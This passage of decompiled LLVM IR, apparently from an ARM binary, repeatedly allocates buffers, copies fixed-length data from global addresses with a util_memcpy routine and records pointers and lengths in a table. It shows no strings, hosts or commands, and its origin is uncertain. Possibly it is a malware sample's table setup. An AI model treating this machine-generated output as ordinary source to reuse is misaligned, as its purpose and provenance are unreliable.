  store i16 %v1_11d58, i16* bitcast (i32* @global_var_27264.614 to i16*), align 4
  %v0_11d5c = call i32 @malloc()
  store i32 23, i32* @r8, align 4
  store i32 %v0_11d5c, i32* @r5, align 4
  %v3_11d70 = call i32 @util_memcpy(i32 %v0_11d5c, i32 ptrtoint (i32* @global_var_1ba8c.616 to i32), i32 23)
  %v0_11d74 = load i32, i32* @sl, align 4
  store i32 %v0_11d74, i32* @r0, align 4
  %v0_11d78 = load i32, i32* @r5, align 4
  store i32 %v0_11d78, i32* @global_var_27268.617, align 4
  %v0_11d7c = load i32, i32* @r8, align 4
  %v1_11d7c = trunc i32 %v0_11d7c to i16
  store i16 %v1_11d7c, i16* bitcast (i32* @global_var_2726c.618 to i16*), align 4
  %v0_11d80 = call i32 @malloc()
  %v0_11d88 = load i32, i32* @sl, align 4
  store i32 %v0_11d80, i32* @r5, align 4
  %v4_11d90 = call i32 @util_memcpy(i32 %v0_11d80, i32 ptrtoint ([9 x i8]* @global_var_1baa4.620 to i32), i32 %v0_11d88)
  store i32 14, i32* @r0, align 4
  %v0_11d98 = load i32, i32* @r5, align 4
  store i32 %v0_11d98, i32* @global_var_27270.621, align 4
  %v0_11d9c = load i32, i32* @sl, align 4
  %v1_11d9c = trunc i32 %v0_11d9c to i16
  store i16 %v1_11d9c, i16* bitcast (i32* @global_var_27274.622 to i16*), align 4
  %v0_11da0 = call i32 @malloc()
  store i32 %v0_11da0, i32* @r5, align 4
  %v3_11db0 = call i32 @util_memcpy(i32 %v0_11da0, i32 ptrtoint (i32* @global_var_1bab0.624 to i32), i32 14)
  %v0_11db8 = load i32, i32* @fp, align 4
  store i32 %v0_11db8, i32* @r0, align 4
  %v0_11dbc = load i32, i32* @r5, align 4
  store i32 %v0_11dbc, i32* @global_var_27278.625, align 4
  store i16 14, i16* bitcast (i32* @global_var_2727c.626 to i16*), align 4
  %v0_11dc4 = call i32 @malloc()
  %v0_11dcc = load i32, i32* @fp, align 4
  store i32 %v0_11dc4, i32* @r5, align 4
  %v3_11dd4 = call i32 @util_memcpy(i32 %v0_11dc4, i32 ptrtoint (i32* @global_var_1bac0.628 to i32), i32 %v0_11dcc)
  %v0_11dd8 = load i32, i32* @r8, align 4
  store i32 %v0_11dd8, i32* @r0, align 4
  %v0_11ddc = load i32, i32* @r5, align 4
  store i32 %v0_11ddc, i32* @global_var_27280.629, align 4
  %v0_11de0 = load i32, i32* @fp, align 4
  %v1_11de0 = trunc i32 %v0_11de0 to i16
  store i16 %v1_11de0, i16* bitcast (i32* @global_var_27284.630 to i16*), align 4
  %v0_11de4 = call i32 @malloc()
  %v0_11dec = load i32, i32* @r8, align 4
  store i32 %v0_11de4, i32* @r5, align 4
  %v3_11df4 = call i32 @util_memcpy(i32 %v0_11de4, i32 ptrtoint (i32* @global_var_1bad4.632 to i32), i32 %v0_11dec)
  store i32 24, i32* @r0, align 4
  %v0_11dfc = load i32, i32* @r5, align 4
  store i32 %v0_11dfc, i32* @global_var_27288.633, align 4
  %v0_11e00 = load i32, i32* @r8, align 4
  %v1_11e00 = trunc i32 %v0_11e00 to i16
  store i16 %v1_11e00, i16* bitcast (i32* @global_var_2728c.634 to i16*), align 4
  %v0_11e04 = call i32 @malloc()
  store i32 %v0_11e04, i32* @r5, align 4
  %v3_11e14 = call i32 @util_memcpy(i32 %v0_11e04, i32 ptrtoint (i32* @global_var_1baec.636 to i32), i32 24)
  store i32 15, i32* @r0, align 4
  store i16 24, i16* bitcast (i32* @global_var_27294.637 to i16*), align 4
  %v0_11e24 = load i32, i32* @r5, align 4
  store i32 %v0_11e24, i32* @global_var_27290.638, align 4
  %v0_11e28 = call i32 @malloc()
  store i32 %v0_11e28, i32* @r5, align 4
  %v3_11e38 = call i32 @util_memcpy(i32 %v0_11e28, i32 ptrtoint (i32* @global_var_1bb08.640 to i32), i32 15)
  %v0_11e40 = load i32, i32* @r7, align 4
  store i32 %v0_11e40, i32* @r0, align 4
  %v0_11e44 = load i32, i32* @r5, align 4
  store i32 %v0_11e44, i32* @global_var_27298.641, align 4
  store i16 15, i16* bitcast (i32* @global_var_2729c.642 to i16*), align 4
  %v0_11e4c = call i32 @malloc()
  %v0_11e50 = load i32, i32* @r7, align 4
  store i32 %v0_11e4c, i32* @r5, align 4
  %v4_11e5c = call i32 @util_memcpy(i32 %v0_11e4c, i32 ptrtoint ([7 x i8]* @global_var_1bb18.644 to i32), i32 %v0_11e50)
  %v0_11e60 = load i32, i32* @r6, align 4
  store i32 %v0_11e60, i32* @r0, align 4
  %v0_11e64 = load i32, i32* @r5, align 4
  store i32 %v0_11e64, i32* @global_var_272a0.645, align 4
  %v0_11e68 = load i32, i32* @r7, align 4
  %v1_11e68 = trunc i32 %v0_11e68 to i16
  store i16 %v1_11e68, i16* bitcast (i32* @global_var_272a4.646 to i16*), align 4
  %v0_11e6c = call i32 @malloc()
  %v0_11e70 = load i32, i32* @r6, align 4
  store i32 %v0_11e6c, i32* @r5, align 4
  %v4_11e7c = call i32 @util_memcpy(i32 %v0_11e6c, i32 ptrtoint ([8 x i8]* @global_var_1bb20.648 to i32), i32 %v0_11e70)
  %v0_11e80 = load i32, i32* @r6, align 4
  store i32 %v0_11e80, i32* @r0, align 4
  %v0_11e84 = load i32, i32* @r5, align 4
  store i32 %v0_11e84, i32* @global_var_272a8.649, align 4
  %v1_11e88 = trunc i32 %v0_11e80 to i16
  store i16 %v1_11e88, i16* bitcast (i32* @global_var_272ac.650 to i16*), align 4
  %v0_11e8c = call i32 @malloc()
  %v0_11e90 = load i32, i32* @r6, align 4
  store i32 %v0_11e8c, i32* @r5, align 4
  %v4_11e9c = call i32 @util_memcpy(i32 %v0_11e8c, i32 ptrtoint ([8 x i8]* @global_var_1bb28.652 to i32), i32 %v0_11e90)
  store i32 3, i32* @r0, align 4
  %v0_11ea4 = load i32, i32* @r5, align 4
  store i32 %v0_11ea4, i32* @global_var_272b0.653, align 4
  %v0_11ea8 = load i32, i32* @r6, align 4
  %v1_11ea8 = trunc i32 %v0_11ea8 to i16
  store i16 %v1_11ea8, i16* bitcast (i32* @global_var_272b4.654 to i16*), align 4
  %v0_11eac = call i32 @malloc()
  store i32 %v0_11eac, i32* @r5, align 4
  %v4_11ebc = call i32 @util_memcpy(i32 %v0_11eac, i32 ptrtoint ([4 x i8]* @global_var_1bb30.656 to i32), i32 3)
  %v0_11ec4 = load i32, i32* @r8, align 4
  store i32 %v0_11ec4, i32* @r0, align 4
  store i16 3, i16* bitcast (i32* @global_var_272bc.657 to i16*), align 4
  %v0_11ecc = load i32, i32* @r5, align 4
  store i32 %v0_11ecc, i32* @global_var_272b8.658, align 4
  %v0_11ed0 = call i32 @malloc()
  %v0_11ed8 = load i32, i32* @r8, align 4
  store i32 %v0_11ed0, i32* @r5, align 4
  %v3_11ee0 = call i32 @util_memcpy(i32 %v0_11ed0, i32 ptrtoint (i32* @global_var_1bb34.660 to i32), i32 %v0_11ed8)
  store i32 28, i32* @r0, align 4
  %v0_11ee8 = load i32, i32* @r5, align 4
  store i32 %v0_11ee8, i32* @global_var_272c0.661, align 4
  %v0_11eec = load i32, i32* @r8, align 4
  %v1_11eec = trunc i32 %v0_11eec to i16
  store i16 %v1_11eec, i16* bitcast (i32* @global_var_272c4.662 to i16*), align 4
  %v0_11ef0 = call i32 @malloc()
  store i32 %v0_11ef0, i32* @r5, align 4
  %v3_11f00 = call i32 @util_memcpy(i32 %v0_11ef0, i32 ptrtoint (i32* @global_var_1bb4c.664 to i32), i32 28)
  %v0_11f08 = load i32, i32* @sb, align 4
  store i32 %v0_11f08, i32* @r0, align 4
  %v0_11f0c = load i32, i32* @r5, align 4
  store i32 %v0_11f0c, i32* @global_var_272c8.665, align 4
  store i16 28, i16* bitcast (i32* @global_var_272cc.666 to i16*), align 4
  %v0_11f14 = call i32 @malloc()
  %v0_11f18 = load i32, i32* @sb, align 4
  store i32 %v0_11f14, i32* @r5, align 4
  %v4_11f24 = call i32 @util_memcpy(i32 %v0_11f14, i32 ptrtoint ([10 x i8]* @global_var_1bb6c.668 to i32), i32 %v0_11f18)
  %v0_11f28 = load i32, i32* @sl, align 4
  store i32 %v0_11f28, i32* @r0, align 4
  %v0_11f2c = load i32, i32* @r5, align 4
  store i32 %v0_11f2c, i32* @global_var_272d0.669, align 4
  %v0_11f30 = load i32, i32* @sb, align 4
  %v1_11f30 = trunc i32 %v0_11f30 to i16
  store i16 %v1_11f30, i16* bitcast (i32* @global_var_272d4.670 to i16*), align 4
  %v0_11f34 = call i32 @malloc()
  %v0_11f3c = load i32, i32* @sl, align 4
  store i32 %v0_11f34, i32* @r5, align 4
  %v4_11f44 = call i32 @util_memcpy(i32 %v0_11f34, i32 ptrtoint ([9 x i8]* @global_var_1baa4.620 to i32), i32 %v0_11f3c)
  store i32 5, i32* @r0, align 4
  %v0_11f4c = load i32, i32* @r5, align 4
  store i32 %v0_11f4c, i32* @global_var_272d8.671, align 4
  %v0_11f50 = load i32, i32* @sl, align 4
  %v1_11f50 = trunc i32 %v0_11f50 to i16
  store i16 %v1_11f50, i16* bitcast (i32* @global_var_272dc.672 to i16*), align 4
  %v0_11f54 = call i32 @malloc()
  store i32 %v0_11f54, i32* @r5, align 4
  %v4_11f64 = call i32 @util_memcpy(i32 %v0_11f54, i32 ptrtoint ([6 x i8]* @global_var_1bb78.674 to i32), i32 5)
  %v0_11f70 = load i32, i32* @r7, align 4
  store i32 %v0_11f70, i32* @r0, align 4
  %v2_11f74 = load i32, i32* @r4, align 4
  %v4_11f74 = add i32 %v2_11f74, 260
  %v5_11f74 = inttoptr i32 %v4_11f74 to i16*
  store i16 5, i16* %v5_11f74, align 2
  %v0_11f78 = load i32, i32* @r5, align 4
  store i32 %v0_11f78, i32* @global_var_272e0.675, align 4
  %v0_11f7c = call i32 @malloc()
  %v0_11f80 = load i32, i32* @r7, align 4
  store i32 %v0_11f7c, i32* @r5, align 4
  %v4_11f8c = call i32 @util_memcpy(i32 %v0_11f7c, i32 ptrtoint ([7 x i8]* @global_var_1bb80.677 to i32), i32 %v0_11f80)
  store i32 16, i32* @r0, align 4
  %v0_11f98 = load i32, i32* @r7, align 4
  %v1_11f98 = trunc i32 %v0_11f98 to i16
  %v2_11f98 = load i32, i32* @r4, align 4
  %v4_11f98 = add i32 %v2_11f98, 268
  %v5_11f98 = inttoptr i32 %v4_11f98 to i16*
  store i16 %v1_11f98, i16* %v5_11f98, align 2
  %v0_11f9c = load i32, i32* @r5, align 4
  store i32 %v0_11f9c, i32* @global_var_272e8.678, align 4
  %v0_11fa0 = call i32 @malloc()
  store i32 %v0_11fa0, i32* %r5.global-to-local, align 4
  %v3_11fb0 = call i32 @util_memcpy(i32 %v0_11fa0, i32 ptrtoint (i32* @global_var_1bb88.680 to i32), i32 16)
  store i32 21, i32* @r0, align 4
  %v2_11fc0 = load i32, i32* @r4, align 4
  %v4_11fc0 = add i32 %v2_11fc0, 276
  %v5_11fc0 = inttoptr i32 %v4_11fc0 to i16*
  store i16 16, i16* %v5_11fc0, align 2
  %v0_11fc4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11fc4, i32* @global_var_272f0.681, align 4
  %v0_11fc8 = load i32, i32* @r0, align 4
  store i32 %v0_11fc8, i32* @r5, align 4
  %v0_11fcc = call i32 @malloc()
  %v0_11fd0 = load i32, i32* @r5, align 4
  store i32 %v0_11fcc, i32* @r6, align 4
  %v3_11fdc = call i32 @util_memcpy(i32 %v0_11fcc, i32 ptrtoint (i32* @global_var_1bb9c.683 to i32), i32 %v0_11fd0)
  %v0_11fe4 = load i32, i32* @r5, align 4
  store i32 %v0_11fe4, i32* @r0, align 4
  %v1_11fe8 = trunc i32 %v0_11fe4 to i16
  %v2_11fe8 = load i32, i32* @r4, align 4
  %v4_11fe8 = add i32 %v2_11fe8, 284
  %v5_11fe8 = inttoptr i32 %v4_11fe8 to i16*
  store i16 %v1_11fe8, i16* %v5_11fe8, align 2
  %v0_11fec = load i32, i32* @r6, align 4
  store i32 %v0_11fec, i32* @global_var_272f8.684, align 4
  %v0_11ff0 = call i32 @malloc()
  %v0_11ff4 = load i32, i32* @r5, align 4
  store i32 %v0_11ff0, i32* @r6, align 4
  %v3_12000 = call i32 @util_memcpy(i32 %v0_11ff0, i32 ptrtoint (i32* @global_var_1bbb4.686 to i32), i32 %v0_11ff4)
  store i32 17, i32* @r0, align 4
  %v0_1200c = load i32, i32* @r5, align 4
  %v1_1200c = trunc i32 %v0_1200c to i16
  %v2_1200c = load i32, i32* @r4, align 4
  %v4_1200c = add i32 %v2_1200c, 292
  %v5_1200c = inttoptr i32 %v4_1200c to i16*
  store i16 %v1_1200c, i16* %v5_1200c, align 2
  %v0_12010 = load i32, i32* @r6, align 4
  store i32 %v0_12010, i32* @global_var_27300.687, align 4
  %v0_12014 = call i32 @malloc()
  store i32 %v0_12014, i32* @r5, align 4
  %v3_12024 = call i32 @util_memcpy(i32 %v0_12014, i32 ptrtoint (i32* @global_var_1bbcc.689 to i32), i32 17)
  store i32 11, i32* @r0, align 4
  %v2_12034 = load i32, i32* @r4, align 4
  %v4_12034 = add i32 %v2_12034, 300
  %v5_12034 = inttoptr i32 %v4_12034 to i16*
  store i16 17, i16* %v5_12034, align 2
  %v0_12038 = load i32, i32* @r5, align 4
  store i32 %v0_12038, i32* @global_var_27308.690, align 4
  %v0_1203c = call i32 @malloc()
  store i32 %v0_1203c, i32* @r5, align 4
  %v0_1204c = load i32, i32* @r7, align 4
  %v1_1204c = add i32 %v0_1204c, 5
  store i32 %v1_1204c, i32* @r7, align 4
  %v4_12050 = call i32 @util_memcpy(i32 %v0_1203c, i32 ptrtoint ([12 x i8]* @global_var_1bbe0.692 to i32), i32 11)
  %v0_12058 = load i32, i32* @r8, align 4
  store i32 %v0_12058, i32* @r0, align 4
  %v0_1205c = load i32, i32* @r7, align 4
  %v1_1205c = trunc i32 %v0_1205c to i16
  %v2_1205c = load i32, i32* @r4, align 4
  %v4_1205c = add i32 %v2_1205c, 308
  %v5_1205c = inttoptr i32 %v4_1205c to i16*
  store i16 %v1_1205c, i16* %v5_1205c, align 2
  %v0_12060 = load i32, i32* @r5, align 4
  store i32 %v0_12060, i32* @global_var_27310.693, align 4
  %v0_12064 = call i32 @malloc()
  %v0_1206c = load i32, i32* @r8, align 4
  store i32 %v0_12064, i32* @r5, align 4
  %v3_12074 = call i32 @util_memcpy(i32 %v0_12064, i32 ptrtoint (i32* @global_var_1bbec.695 to i32), i32 %v0_1206c)
  store i32 83, i32* @r0, align 4
  %v0_12080 = load i32, i32* @r8, align 4
  %v1_12080 = trunc i32 %v0_12080 to i16
  %v2_12080 = load i32, i32* @r4, align 4
  %v4_12080 = add i32 %v2_12080, 316
  %v5_12080 = inttoptr i32 %v4_12080 to i16*
  store i16 %v1_12080, i16* %v5_12080, align 2
  %v0_12084 = load i32, i32* @r5, align 4
  store i32 %v0_12084, i32* @global_var_27318.696, align 4
  %v0_12088 = call i32 @malloc()
  store i32 %v0_12088, i32* @r5, align 4
  %v3_12098 = call i32 @util_memcpy(i32 %v0_12088, i32 ptrtoint (i32* @global_var_1bf10.698 to i32), i32 83)
  store i32 32, i32* @r0, align 4
  %v2_120a8 = load i32, i32* @r4, align 4
  %v4_120a8 = add i32 %v2_120a8, 324
  %v5_120a8 = inttoptr i32 %v4_120a8 to i16*
  store i16 83, i16* %v5_120a8, align 2
  %v0_120ac = load i32, i32* @r5, align 4
  store i32 %v0_120ac, i32* @global_var_27320.699, align 4
  %v0_120b0 = call i32 @malloc()
  store i32 %v0_120b0, i32* @r5, align 4
  %v3_120c0 = call i32 @util_memcpy(i32 %v0_120b0, i32 ptrtoint (i32* @global_var_1bf64.701 to i32), i32 32)
  store i32 48, i32* @r0, align 4
  %v2_120d0 = load i32, i32* @r4, align 4
  %v4_120d0 = add i32 %v2_120d0, 332
  %v5_120d0 = inttoptr i32 %v4_120d0 to i16*
  store i16 32, i16* %v5_120d0, align 2
  %v0_120d4 = load i32, i32* @r5, align 4
  store i32 %v0_120d4, i32* @global_var_27328.702, align 4
  %v0_120d8 = call i32 @malloc()
  store i32 %v0_120d8, i32* @r5, align 4
  %v3_120e8 = call i32 @util_memcpy(i32 %v0_120d8, i32 ptrtoint (i32* @global_var_1bc04.704 to i32), i32 48)
  store i32 12, i32* @r0, align 4
  %v2_120f8 = load i32, i32* @r4, align 4
  %v4_120f8 = add i32 %v2_120f8, 340
  %v5_120f8 = inttoptr i32 %v4_120f8 to i16*
  store i16 48, i16* %v5_120f8, align 2
  %v0_120fc = load i32, i32* @r5, align 4
  store i32 %v0_120fc, i32* @global_var_27330.705, align 4
  %v0_12100 = call i32 @malloc()
  store i32 12, i32* @r6, align 4
  store i32 %v0_12100, i32* @r5, align 4
  %v3_12114 = call i32 @util_memcpy(i32 %v0_12100, i32 ptrtoint (i32* @global_var_1bc38.707 to i32), i32 12)
  %v0_1211c = load i32, i32* @sb, align 4
  store i32 %v0_1211c, i32* @r0, align 4
  %v0_12120 = load i32, i32* @r6, align 4
  %v1_12120 = trunc i32 %v0_12120 to i16
  %v2_12120 = load i32, i32* @r4, align 4
  %v4_12120 = add i32 %v2_12120, 348
  %v5_12120 = inttoptr i32 %v4_12120 to i16*
  store i16 %v1_12120, i16* %v5_12120, align 2
  %v0_12124 = load i32, i32* @r5, align 4
  store i32 %v0_12124, i32* @global_var_27338.708, align 4
  %v0_12128 = call i32 @malloc()
  %v0_1212c = load i32, i32* @sb, align 4
  store i32 %v0_12128, i32* @r5, align 4
  %v3_12138 = call i32 @util_memcpy(i32 %v0_12128, i32 ptrtoint (i32* @global_var_1bc48.710 to i32), i32 %v0_1212c)
  store i32 10, i32* @r0, align 4
  %v0_12144 = load i32, i32* @sb, align 4
  %v1_12144 = trunc i32 %v0_12144 to i16
  %v2_12144 = load i32, i32* @r4, align 4
  %v4_12144 = add i32 %v2_12144, 356
  %v5_12144 = inttoptr i32 %v4_12144 to i16*
  store i16 %v1_12144, i16* %v5_12144, align 2
  %v0_12148 = load i32, i32* @r5, align 4
  store i32 %v0_12148, i32* @global_var_27340.711, align 4
  %v0_1214c = call i32 @malloc()
  store i32 %v0_1214c, i32* @r5, align 4
  %v0_1215c = load i32, i32* @sb, align 4
  %v1_1215c = add i32 %v0_1215c, 1
  store i32 %v1_1215c, i32* @sb, align 4
  %v3_12160 = call i32 @util_memcpy(i32 %v0_1214c, i32 ptrtoint (i32* @global_var_1bc54.713 to i32), i32 10)
  %v0_12168 = load i32, i32* @r6, align 4
  store i32 %v0_12168, i32* @r0, align 4
  %v0_1216c = load i32, i32* @sb, align 4
  %v1_1216c = trunc i32 %v0_1216c to i16
  %v2_1216c = load i32, i32* @r4, align 4
  %v4_1216c = add i32 %v2_1216c, 364
  %v5_1216c = inttoptr i32 %v4_1216c to i16*
  store i16 %v1_1216c, i16* %v5_1216c, align 2
  %v0_12170 = load i32, i32* @r5, align 4
  store i32 %v0_12170, i32* @global_var_27348.714, align 4
  %v0_12174 = call i32 @malloc()
  %v0_12178 = load i32, i32* @r6, align 4
  store i32 %v0_12174, i32* @r5, align 4
  %v3_12184 = call i32 @util_memcpy(i32 %v0_12174, i32 ptrtoint (i32* @global_var_1bc60.716 to i32), i32 %v0_12178)
  store i32 16, i32* @r0, align 4
  %v0_12190 = load i32, i32* @r6, align 4
  %v1_12190 = trunc i32 %v0_12190 to i16
  %v2_12190 = load i32, i32* @r4, align 4
  %v4_12190 = add i32 %v2_12190, 372
  %v5_12190 = inttoptr i32 %v4_12190 to i16*
  store i16 %v1_12190, i16* %v5_12190, align 2
  %v0_12194 = load i32, i32* @r5, align 4
  store i32 %v0_12194, i32* @global_var_27350.717, align 4
  %v0_12198 = call i32 @malloc()
  store i32 %v0_12198, i32* @r5, align 4
  %v3_121a8 = call i32 @util_memcpy(i32 %v0_12198, i32 ptrtoint (i32* @global_var_1bc70.719 to i32), i32 16)
  %v0_121b4 = load i32, i32* @fp, align 4
  store i32 %v0_121b4, i32* @r0, align 4
  %v2_121b8 = load i32, i32* @r4, align 4
  %v4_121b8 = add i32 %v2_121b8, 380
  %v5_121b8 = inttoptr i32 %v4_121b8 to i16*
  store i16 16, i16* %v5_121b8, align 2
  %v0_121bc = load i32, i32* @r5, align 4
  store i32 %v0_121bc, i32* @global_var_27358.720, align 4
  %v0_121c0 = call i32 @malloc()
  %v0_121c8 = load i32, i32* @fp, align 4
  store i32 %v0_121c0, i32* @r5, align 4
  %v3_121d0 = call i32 @util_memcpy(i32 %v0_121c0, i32 ptrtoint (i32* @global_var_1bc84.722 to i32), i32 %v0_121c8)
  %v0_121d8 = load i32, i32* @sl, align 4
  store i32 %v0_121d8, i32* @r0, align 4
  %v0_121dc = load i32, i32* @fp, align 4
  %v1_121dc = trunc i32 %v0_121dc to i16
  %v2_121dc = load i32, i32* @r4, align 4
  %v4_121dc = add i32 %v2_121dc, 388
  %v5_121dc = inttoptr i32 %v4_121dc to i16*
  store i16 %v1_121dc, i16* %v5_121dc, align 2
  %v0_121e0 = load i32, i32* @r5, align 4
  store i32 %v0_121e0, i32* @global_var_27360.723, align 4
  %v0_121e4 = call i32 @malloc()
  %v0_121ec = load i32, i32* @sl, align 4
  store i32 %v0_121e4, i32* @r5, align 4
  %v4_121f4 = call i32 @util_memcpy(i32 %v0_121e4, i32 ptrtoint ([9 x i8]* @global_var_1bc98.725 to i32), i32 %v0_121ec)
  %v0_121fc = load i32, i32* @r7, align 4
  store i32 %v0_121fc, i32* @r0, align 4
  %v0_12200 = load i32, i32* @sl, align 4
  %v1_12200 = trunc i32 %v0_12200 to i16
  %v2_12200 = load i32, i32* @r4, align 4
  %v4_12200 = add i32 %v2_12200, 396
  %v5_12200 = inttoptr i32 %v4_12200 to i16*
  store i16 %v1_12200, i16* %v5_12200, align 2
  %v0_12204 = load i32, i32* @r5, align 4
  store i32 %v0_12204, i32* @global_var_27368.726, align 4
  %v0_12208 = call i32 @malloc()
  %v0_12210 = load i32, i32* @r7, align 4
  store i32 %v0_12208, i32* @r5, align 4
  %v3_12218 = call i32 @util_memcpy(i32 %v0_12208, i32 ptrtoint (i32* @global_var_1bbf8.728 to i32), i32 %v0_12210)
  %v0_12220 = load i32, i32* @r6, align 4
  store i32 %v0_12220, i32* @r0, align 4
  %v0_12224 = load i32, i32* @r7, align 4
  %v1_12224 = trunc i32 %v0_12224 to i16
  %v2_12224 = load i32, i32* @r4, align 4
  %v4_12224 = add i32 %v2_12224, 404
  %v5_12224 = inttoptr i32 %v4_12224 to i16*
  store i16 %v1_12224, i16* %v5_12224, align 2
  %v0_12228 = load i32, i32* @r5, align 4
  store i32 %v0_12228, i32* @global_var_27370.729, align 4
  %v0_1222c = call i32 @malloc()
  %v0_12230 = load i32, i32* @r6, align 4
  store i32 %v0_1222c, i32* @r5, align 4
  %v3_1223c = call i32 @util_memcpy(i32 %v0_1222c, i32 ptrtoint (i32* @global_var_1bca4.731 to i32), i32 %v0_12230)
  store i32 18, i32* @r0, align 4
  %v0_12248 = load i32, i32* @r6, align 4
  %v1_12248 = trunc i32 %v0_12248 to i16
  %v2_12248 = load i32, i32* @r4, align 4
  %v4_12248 = add i32 %v2_12248, 412
  %v5_12248 = inttoptr i32 %v4_12248 to i16*
  store i16 %v1_12248, i16* %v5_12248, align 2
  %v0_1224c = load i32, i32* @r5, align 4
  store i32 %v0_1224c, i32* @global_var_27378.732, align 4
  %v0_12250 = call i32 @malloc()
  store i32 %v0_12250, i32* @r5, align 4
  %v3_12260 = call i32 @util_memcpy(i32 %v0_12250, i32 ptrtoint (i32* @global_var_1bcb4.734 to i32), i32 18)
  store i32 25, i32* @r0, align 4
  %v2_12270 = load i32, i32* @r4, align 4
  %v4_12270 = add i32 %v2_12270, 420
  %v5_12270 = inttoptr i32 %v4_12270 to i16*
  store i16 18, i16* %v5_12270, align 2
  %v0_12274 = load i32, i32* @r5, align 4
  store i32 %v0_12274, i32* @global_var_27380.735, align 4
  %v0_12278 = call i32 @malloc()
  store i32 %v0_12278, i32* %r5.global-to-local, align 4
  %v3_12288 = call i32 @util_memcpy(i32 %v0_12278, i32 ptrtoint (i32* @global_var_1bcc8.737 to i32), i32 25)
  store i32 115, i32* @r0, align 4
  %v2_12298 = load i32, i32* @r4, align 4
  %v4_12298 = add i32 %v2_12298, 428
  %v5_12298 = inttoptr i32 %v4_12298 to i16*
  store i16 25, i16* %v5_12298, align 2
  %v0_1229c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1229c, i32* @global_var_27388.738, align 4
  %v0_122a0 = load i32, i32* @r0, align 4
  store i32 %v0_122a0, i32* @r5, align 4
  %v0_122a4 = call i32 @malloc()
  %v0_122a8 = load i32, i32* @r5, align 4
  store i32 %v0_122a4, i32* @r6, align 4
  %v3_122b4 = call i32 @util_memcpy(i32 %v0_122a4, i32 ptrtoint (i32* @global_var_1bce4.740 to i32), i32 %v0_122a8)
  %v0_122bc = load i32, i32* @r5, align 4
  store i32 %v0_122bc, i32* @r0, align 4
  %v1_122c0 = trunc i32 %v0_122bc to i16
  %v2_122c0 = load i32, i32* @r4, align 4
  %v4_122c0 = add i32 %v2_122c0, 436
  %v5_122c0 = inttoptr i32 %v4_122c0 to i16*
  store i16 %v1_122c0, i16* %v5_122c0, align 2
  %v0_122c4 = load i32, i32* @r6, align 4
  store i32 %v0_122c4, i32* @global_var_27390.741, align 4
  %v0_122c8 = call i32 @malloc()
  %v0_122cc = load i32, i32* @r5, align 4
  store i32 %v0_122c8, i32* @r6, align 4
  %v3_122d8 = call i32 @util_memcpy(i32 %v0_122c8, i32 ptrtoint (i32* @global_var_1bd58.743 to i32), i32 %v0_122cc)
  store i32 79, i32* @r0, align 4
  %v0_122e4 = load i32, i32* @r5, align 4
  %v1_122e4 = trunc i32 %v0_122e4 to i16
  %v2_122e4 = load i32, i32* @r4, align 4
  %v4_122e4 = add i32 %v2_122e4, 444
  %v5_122e4 = inttoptr i32 %v4_122e4 to i16*
  store i16 %v1_122e4, i16* %v5_122e4, align 2
  %v0_122e8 = load i32, i32* @r6, align 4
  store i32 %v0_122e8, i32* @global_var_27398.744, align 4
  %v0_122ec = call i32 @malloc()
  store i32 %v0_122ec, i32* %r5.global-to-local, align 4
  %v3_122fc = call i32 @util_memcpy(i32 %v0_122ec, i32 ptrtoint (i32* @global_var_1bdcc.746 to i32), i32 79)
  store i32 114, i32* @r0, align 4
  %v2_1230c = load i32, i32* @r4, align 4
  %v4_1230c = add i32 %v2_1230c, 452
  %v5_1230c = inttoptr i32 %v4_1230c to i16*
  store i16 79, i16* %v5_1230c, align 2
  %v0_12310 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12310, i32* @global_var_273a0.747, align 4
  %v0_12314 = load i32, i32* @r0, align 4
  store i32 %v0_12314, i32* @r5, align 4
  %v0_12318 = call i32 @malloc()
  %v0_1231c = load i32, i32* @r5, align 4
  store i32 %v0_12318, i32* @r6, align 4
  %v3_12328 = call i32 @util_memcpy(i32 %v0_12318, i32 ptrtoint (i32* @global_var_1be1c.749 to i32), i32 %v0_1231c)
  %v0_12330 = load i32, i32* @r5, align 4
  store i32 %v0_12330, i32* @r0, align 4
  %v1_12334 = trunc i32 %v0_12330 to i16
  %v2_12334 = load i32, i32* @r4, align 4
  %v4_12334 = add i32 %v2_12334, 460
  %v5_12334 = inttoptr i32 %v4_12334 to i16*
  store i16 %v1_12334, i16* %v5_12334, align 2
  %v0_12338 = load i32, i32* @r6, align 4
  store i32 %v0_12338, i32* @global_var_273a8.750, align 4
  %v0_1233c = call i32 @malloc()
  %v0_12340 = load i32, i32* @r5, align 4
  store i32 %v0_1233c, i32* @r6, align 4
  %v3_1234c = call i32 @util_memcpy(i32 %v0_1233c, i32 ptrtoint (i32* @global_var_1be90.752 to i32), i32 %v0_12340)
  store i32 14, i32* @r0, align 4
  %v0_12358 = load i32, i32* @r5, align 4
  %v1_12358 = trunc i32 %v0_12358 to i16
  %v2_12358 = load i32, i32* @r4, align 4
  %v4_12358 = add i32 %v2_12358, 468
  %v5_12358 = inttoptr i32 %v4_12358 to i16*
  store i16 %v1_12358, i16* %v5_12358, align 2
  %v0_1235c = load i32, i32* @r6, align 4
  store i32 %v0_1235c, i32* @global_var_273b0.753, align 4
  %v0_12360 = call i32 @malloc()
  store i32 %v0_12360, i32* @r5, align 4
  %v3_12370 = call i32 @util_memcpy(i32 %v0_12360, i32 ptrtoint (i32* @global_var_1bab0.624 to i32), i32 14)
  %v0_1237c = load i32, i32* @fp, align 4
  store i32 %v0_1237c, i32* @r0, align 4
  %v2_12380 = load i32, i32* @r4, align 4
  %v4_12380 = add i32 %v2_12380, 476
  %v5_12380 = inttoptr i32 %v4_12380 to i16*
  store i16 14, i16* %v5_12380, align 2
  %v0_12384 = load i32, i32* @r5, align 4
  store i32 %v0_12384, i32* @global_var_273b8.754, align 4
  %v0_12388 = call i32 @malloc()
  %v0_12390 = load i32, i32* @fp, align 4
  store i32 %v0_12388, i32* @r5, align 4
  %v3_12398 = call i32 @util_memcpy(i32 %v0_12388, i32 ptrtoint (i32* @global_var_1bac0.628 to i32), i32 %v0_12390)
  %v0_123a0 = load i32, i32* @r8, align 4
  store i32 %v0_123a0, i32* @r0, align 4
  %v0_123a4 = load i32, i32* @fp, align 4
  %v1_123a4 = trunc i32 %v0_123a4 to i16
  %v2_123a4 = load i32, i32* @r4, align 4
  %v4_123a4 = add i32 %v2_123a4, 484
  %v5_123a4 = inttoptr i32 %v4_123a4 to i16*
  store i16 %v1_123a4, i16* %v5_123a4, align 2
  %v0_123a8 = load i32, i32* @r5, align 4
  store i32 %v0_123a8, i32* @global_var_273c0.755, align 4
  %v0_123ac = call i32 @malloc()
